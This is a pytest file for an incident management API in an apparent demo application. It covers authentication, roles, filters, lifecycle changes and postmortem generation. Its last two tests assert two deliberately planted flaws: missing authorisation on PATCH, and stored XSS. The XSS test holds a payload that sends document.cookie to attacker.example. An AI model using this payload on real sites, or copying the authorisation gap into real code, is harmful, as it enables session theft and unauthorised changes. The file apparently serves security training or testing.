"""Incident management API tests.

Note: VULN-130 (stored XSS via timeline notes) and VULN-131 (missing authorisation on
``PATCH /api/incidents/{id}``) are planted on purpose. The tests below assert the current
insecure behaviour so a remediation PR is forced to update them deliberately.
"""

from app.models.incidents import Incident
from app.services.incidents import build_postmortem, next_reference


def _declare(client, headers, **overrides):
    payload = {
        "title": "Booking availability degraded",
        "severity": 1,
        "service": "booking",
        "summary": "Availability calls failing for long-haul routes.",
    }
    payload.update(overrides)
    response = client.post("/api/incidents", json=payload, headers=headers)
    assert response.status_code == 201, response.text
    return response.json()


def test_seeded_board_is_populated(client, auth_headers):
    incidents = client.get("/api/incidents", headers=auth_headers("sre@iberia.demo")).json()
    references = {incident["reference"] for incident in incidents}
    assert {"INC-2026-0001", "INC-2026-0002"} <= references

    resolved = next(i for i in incidents if i["reference"] == "INC-2026-0001")
    assert resolved["status"] == "resolved"
    assert resolved["resolved_at"] is not None
    assert len(resolved["timeline"]) >= 5
    assert resolved["duration_minutes"] > 0

    open_sev1 = next(i for i in incidents if i["reference"] == "INC-2026-0002")
    assert open_sev1["status"] == "open"
    assert open_sev1["severity"] == 1
    assert "Sev1" in open_sev1["response_expectation"]


def test_requires_authentication(client):
    assert client.get("/api/incidents").status_code == 401


def test_declare_incident_requires_ops_role(client, auth_headers):
    response = client.post(
        "/api/incidents",
        json={"title": "Customer declared outage", "severity": 0, "service": "booking"},
        headers=auth_headers("customer@iberia.demo"),
    )
    assert response.status_code == 403


def test_declare_incident_shape_and_reference(client, auth_headers):
    headers = auth_headers("ops@iberia.demo")
    incident = _declare(client, headers, alert_name="IberiaApiHighErrorRate")

    assert incident["reference"].startswith("INC-")
    assert incident["status"] == "open"
    assert incident["commander"] == "Diego Salas"
    assert incident["runbook"] == "docs/runbooks/IberiaApiHighErrorRate.md"
    assert incident["timeline"][0]["kind"] == "detect"
    assert incident["resolved_at"] is None

    fetched = client.get(f"/api/incidents/{incident['id']}", headers=headers).json()
    assert fetched["reference"] == incident["reference"]


def test_list_filters(client, auth_headers):
    headers = auth_headers("sre@iberia.demo")
    open_only = client.get("/api/incidents?status=open", headers=headers).json()
    assert open_only and all(i["status"] == "open" for i in open_only)

    by_service = client.get("/api/incidents?service=payments", headers=headers).json()
    assert all(i["service"] == "payments" for i in by_service)

    by_severity = client.get("/api/incidents?severity=3", headers=headers).json()
    assert all(i["severity"] == 3 for i in by_severity)


def test_unknown_incident_returns_404(client, auth_headers):
    assert client.get("/api/incidents/999999", headers=auth_headers()).status_code == 404


def test_lifecycle_transitions_append_timeline(client, auth_headers):
    headers = auth_headers("sre@iberia.demo")
    incident = _declare(client, headers, title="Loyalty accrual stalled", service="loyalty")

    mitigated = client.patch(
        f"/api/incidents/{incident['id']}",
        json={"status": "mitigated", "commander": "Nuria Vidal"},
        headers=headers,
    ).json()
    assert mitigated["status"] == "mitigated"
    assert mitigated["timeline"][-1]["kind"] == "mitigation"

    resolved = client.patch(
        f"/api/incidents/{incident['id']}",
        json={"status": "resolved", "resolution": "Replayed the accrual queue.", "severity": 2},
        headers=headers,
    ).json()
    assert resolved["status"] == "resolved"
    assert resolved["severity"] == 2
    assert resolved["resolved_at"] is not None
    assert resolved["timeline"][-1]["kind"] == "resolve"


def test_timeline_entry_append(client, auth_headers):
    headers = auth_headers("ops@iberia.demo")
    incident = _declare(client, headers, title="Check-in kiosk errors", service="checkin")

    response = client.post(
        f"/api/incidents/{incident['id']}/timeline",
        json={"kind": "note", "message": "Kiosk 14 at MAD T4 restarted."},
        headers=headers,
    )
    assert response.status_code == 201
    entry = response.json()
    assert set(entry) == {"id", "ts", "kind", "message", "author"}
    assert entry["author"] == "Diego Salas"

    detail = client.get(f"/api/incidents/{incident['id']}", headers=headers).json()
    assert detail["timeline"][-1]["message"] == "Kiosk 14 at MAD T4 restarted."


def test_postmortem_contains_timeline_and_action_items(client, auth_headers):
    headers = auth_headers("sre@iberia.demo")
    incidents = client.get("/api/incidents?status=resolved", headers=headers).json()
    incident = next(i for i in incidents if i["reference"] == "INC-2026-0001")

    response = client.get(f"/api/incidents/{incident['id']}/postmortem", headers=headers)
    assert response.status_code == 200
    body = response.json()
    assert body["incident_id"] == incident["id"]

    markdown = body["markdown"]
    assert f"# Postmortem — {incident['reference']}" in markdown
    for section in ("## Impact", "## Timeline", "## Action items", "## Lessons learned"):
        assert section in markdown
    assert "Socket timeout cut" in markdown
    assert "41% of the 28-day error budget" in markdown


def test_alerts_shape(client, auth_headers):
    headers = auth_headers("sre@iberia.demo")
    # Generate traffic so the shared HTTP histogram has observations to evaluate.
    for _ in range(5):
        client.get("/healthz")

    response = client.get("/api/incidents/alerts", headers=headers)
    assert response.status_code == 200
    alerts = response.json()
    assert isinstance(alerts, list)
    for alert in alerts:
        assert {"name", "severity", "service", "state", "since", "summary"} <= set(alert)
        assert alert["state"] in {"firing", "pending", "resolved"}
        assert 0 <= alert["severity"] <= 3


def test_next_reference_increments(db):
    reference = next_reference(db)
    assert reference.startswith("INC-")
    sequence = int(reference.rsplit("-", 1)[-1])
    assert sequence > 4


def test_postmortem_skeleton_for_bare_incident(db):
    incident = Incident(
        reference="INC-1999-9999",
        title="Bare incident",
        severity=0,
        status="open",
        service="platform",
        summary="",
    )
    markdown = build_postmortem(incident)
    assert "Sev0" in markdown
    assert "no timeline entries recorded" in markdown


def test_planted_vuln_131_any_authenticated_user_can_resolve(client, auth_headers):
    """VULN-131: PATCH has no role dependency, so a customer can close an incident."""
    incident = _declare(
        client,
        auth_headers("ops@iberia.demo"),
        title="Audit integrity check",
        service="payments",
    )
    response = client.patch(
        f"/api/incidents/{incident['id']}",
        json={"status": "resolved", "severity": 3, "resolution": "nothing to see here"},
        headers=auth_headers("customer@iberia.demo"),
    )
    assert response.status_code == 200
    assert response.json()["status"] == "resolved"


def test_planted_vuln_130_timeline_stores_raw_html(client, auth_headers):
    """VULN-130: timeline notes are stored and served without escaping."""
    headers = auth_headers("ops@iberia.demo")
    incident = _declare(client, headers, title="XSS demo", service="booking")
    payload = "<img src=x onerror=\"fetch('https://attacker.example/?c='+document.cookie)\">"

    client.post(
        f"/api/incidents/{incident['id']}/timeline",
        json={"kind": "note", "message": payload},
        headers=headers,
    )
    detail = client.get(f"/api/incidents/{incident['id']}", headers=headers).json()
    assert detail["timeline"][-1]["message"] == payload

    postmortem = client.get(f"/api/incidents/{incident['id']}/postmortem", headers=headers).json()
    assert payload in postmortem["markdown"]
